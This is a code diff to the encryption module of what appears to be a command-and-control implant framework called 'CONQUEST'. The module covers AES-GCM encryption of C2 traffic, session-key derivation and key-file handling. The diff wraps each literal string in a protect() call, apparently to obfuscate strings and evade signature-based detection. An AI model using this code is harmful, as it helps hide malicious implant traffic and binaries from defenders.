@@ -1,7 +1,7 @@
-import macros, system
+import macros, system, hashes
 import nimcrypto
 
-import ./[utils, types]
+import ./[types, utils]
 
 #[
     Symmetric AES256 GCM encryption for secure C2 traffic
@@ -10,7 +10,7 @@ import ./[utils, types]
 proc generateBytes*(T: typedesc[Key | Iv]): array =
     var bytes: T
     if randomBytes(bytes) != sizeof(T): 
-        raise newException(CatchableError, "Failed to generate byte array.")
+        raise newException(CatchableError, protect("Failed to generate byte array."))
     return bytes
 
 proc encrypt*(key: Key, iv: Iv, data: seq[byte], sequenceNumber: uint32 = 0): (seq[byte], AuthenticationTag) =
@@ -48,7 +48,7 @@ proc validateDecryption*(key: Key, iv: Iv, encData: seq[byte], sequenceNumber: u
     let (decData, gmac) = decrypt(key, iv, encData, sequenceNumber)
 
     if gmac != header.gmac: 
-        raise newException(CatchableError, "Invalid authentication tag.")
+        raise newException(CatchableError, protect("Invalid authentication tag."))
 
     return decData
 
@@ -110,7 +110,7 @@ proc deriveSessionKey*(keyPair: KeyPair, publicKey: Key): Key =
 
     # Add combined public keys to hash
     let combinedKeys: Key = combineKeys(keyPair.publicKey, publicKey)
-    let hashMessage: seq[byte] = string.toBytes("CONQUEST") & @combinedKeys 
+    let hashMessage: seq[byte] = string.toBytes(protect("CONQUEST")) & @combinedKeys 
 
     # Calculate Blake2b hash and extract the first 32 bytes for the AES key (https://monocypher.org/manual/blake2b)
     let hash = blake2b(hashMessage, sharedSecret)
@@ -129,7 +129,7 @@ proc writeKeyToDisk*(keyFile: string, key: Key) =
     let bytesWritten = file.writeBytes(key, 0, sizeof(Key))
 
     if bytesWritten != sizeof(Key):
-        raise newException(ValueError, "Invalid key length.")
+        raise newException(ValueError, protect("Invalid key length."))
 
 proc loadKeyPair*(keyFile: string): KeyPair = 
     try: 
@@ -140,7 +140,7 @@ proc loadKeyPair*(keyFile: string): KeyPair =
         let bytesRead = file.readBytes(privateKey, 0, sizeof(Key))
 
         if bytesRead != sizeof(Key):
-            raise newException(ValueError, "Invalid key length.")
+            raise newException(ValueError, protect("Invalid key length."))
 
         return KeyPair(
             privateKey: privateKey,
